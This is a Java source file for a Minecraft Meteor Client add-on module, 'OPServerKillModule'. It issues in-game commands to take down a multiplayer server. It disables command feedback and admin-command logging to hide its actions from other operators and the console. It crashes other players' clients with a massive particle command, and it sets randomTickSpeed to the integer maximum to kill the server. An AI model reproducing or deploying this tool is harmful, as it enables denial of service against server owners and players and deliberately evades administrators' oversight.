package pwn.noobs.trouserstreak.modules;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.player.ChatUtils;
import meteordevelopment.orbit.EventHandler;
import pwn.noobs.trouserstreak.Trouser;

public class OPServerKillModule extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    public final Setting<Boolean> dontBeStupid = sgGeneral.add(new BoolSetting.Builder()
            .name("restrict-singleplayer-use")
            .description("Does not allow you to screw up your singleplayer worlds. Turn off for 'testing' purposes.")
            .defaultValue(true)
            .build()
    );
    public final Setting<Boolean> notOP = sgGeneral.add(new BoolSetting.Builder()
            .name("toggle-if-not-op")
            .description("Turn this off to prevent the bug of module always being turned off when you join server.")
            .defaultValue(false)
            .build()
    );
    private final Setting<Boolean> sendCommandFeedback = sgGeneral.add(new BoolSetting.Builder()
            .name("turn-off-sendCommandFeedback")
            .description("Makes commands invisible to other operators.")
            .defaultValue(true)
            .build()
    );
    private final Setting<Boolean> logAdminCommands = sgGeneral.add(new BoolSetting.Builder()
            .name("turn-off-logAdminCommands")
            .description("Hides the kill command from console logs.")
            .defaultValue(true)
            .build()
    );
    private final Setting<Boolean> crashOtherPlayers = sgGeneral.add(new BoolSetting.Builder()
            .name("crash-other-players")
            .description("Crashes everyone else's minecraft client. Don't forget to enable Anti Crash in Rejects!")
            .defaultValue(true)
            .build()
    );
    private final Setting<Integer> killvalue = sgGeneral.add(new IntSetting.Builder()
            .name("randomTickSpeed-(kill-value)")
            .description("This is what kills the server. Max value recommended.")
            .defaultValue(2147483647)
            .min(0)
                    .max(2147483647)
                    .sliderRange(0, 2147483647)
            .build()
    );

    public OPServerKillModule() {
        super(Trouser.Main, "OPServerKillModule", "Runs a set of commands to disable a server. Requires OP. (ONLY USE IF YOU'RE 100% SURE)");
    }

    @Override
    public void onActivate() {
        if (dontBeStupid.get() && mc.getInstance().isInSingleplayer()) {
            toggle();
            error("Don't break your single player world, it sucks.");
        }
        if (notOP.get() && !(mc.player.hasPermissionLevel(2)) && mc.world.isChunkLoaded(mc.player.getChunkPos().x, mc.player.getChunkPos().z)) {
            toggle();
            error("Must have permission level 2 or higher");
        }
    }

    @EventHandler
    public void onTick(TickEvent.Pre event) {
        // Sending messages each tick is not required due to the packet queue
        if(sendCommandFeedback.get()) ChatUtils.sendPlayerMsg("/gamerule sendCommandFeedback false");
        if(logAdminCommands.get()) ChatUtils.sendPlayerMsg("/gamerule logAdminCommands false");
        if(crashOtherPlayers.get()) ChatUtils.sendPlayerMsg("/execute at @a[distance=.1..] run particle ash ~ ~ ~ 1 1 1 1 2147483647 force @a[distance=.1..]");
        ChatUtils.sendPlayerMsg("/gamerule randomTickSpeed " + killvalue.get());
        toggle();
        error("Server Killed.");
    }
}